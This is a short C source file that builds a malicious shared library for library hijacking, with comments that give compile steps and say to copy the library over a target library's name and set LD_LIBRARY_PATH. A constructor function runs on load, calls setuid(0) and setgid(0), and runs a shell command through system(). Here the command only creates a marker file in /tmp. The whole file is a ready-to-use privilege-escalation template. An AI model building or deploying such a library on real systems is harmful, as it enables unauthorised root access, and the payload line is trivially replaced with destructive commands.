// To Compile
// gcc -Wall -fPIC -c -o hax.o hax.c
// gcc -shared -o libhax.so hax.o
// export LD_LIBRARY_PATH=path/to/file
// cp libhax.so name_of_library_to_hack

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h> // for setuid/setgid


static void runmahpayload() __attribute__((constructor));
void runmahpayload() {
 setuid(0);
 setgid(0);
 printf("DLL HIJACKING IN PROGRESS \n");
 system("touch /tmp/haxso.txt");
}
